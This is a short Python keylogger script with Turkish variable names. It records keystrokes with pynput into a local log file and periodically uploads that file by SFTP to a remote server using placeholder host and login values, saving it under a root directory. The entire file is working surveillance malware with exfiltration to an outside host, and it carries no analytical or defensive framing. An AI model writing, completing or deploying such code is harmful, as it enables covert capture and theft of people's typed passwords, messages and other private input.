from paramiko import SSHClient, AutoAddPolicy
from paramiko.auth_handler import AuthenticationException, SSHException
from pynput.keyboard import Key, Listener
import os
import time

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                f.write(" ")
            elif k == "Key.enter":
                f.write("\n")
            elif k.startswith("Key."):
                continue
            else:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

def gonder_abisi(dosya, kayityeri):
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh.connect("sunucu", username="kullanici", password="sifre")
        sftp = ssh.open_sftp()
        sftp.put(dosya, kayityeri)
        sftp.close()
        ssh.close()
    except (AuthenticationException, SSHException) as e:
        print(f"Bağlantı hatası: {e}")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

starttime = time.time()
while True:
    if os.path.exists("log.txt") and os.path.getsize("log.txt") > 0:
        gonder_abisi("log.txt", f"/root/kayitlar/log{str(int(time.time()))}.txt")
        open("log.txt", "w").close()
    time.sleep(30.0 - ((time.time() - starttime) % 30.0))
